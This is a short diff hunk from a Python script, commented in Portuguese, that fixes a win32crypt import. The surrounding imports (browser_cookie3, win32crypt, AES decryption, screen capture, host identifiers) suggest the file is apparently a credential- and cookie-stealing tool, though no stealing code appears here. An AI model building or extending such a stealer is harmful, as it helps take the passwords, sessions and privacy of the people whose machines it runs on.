@@ -10,7 +10,7 @@ import browser_cookie3
 import platform
 import socket
 import uuid
-import win32crypt  # Necessário para Windows
+from win32 import win32crypt  # Necessário para Windows
 from Cryptodome.Cipher import AES
 from pathlib import Path
 from PIL import ImageGrab  # Para captura de tela
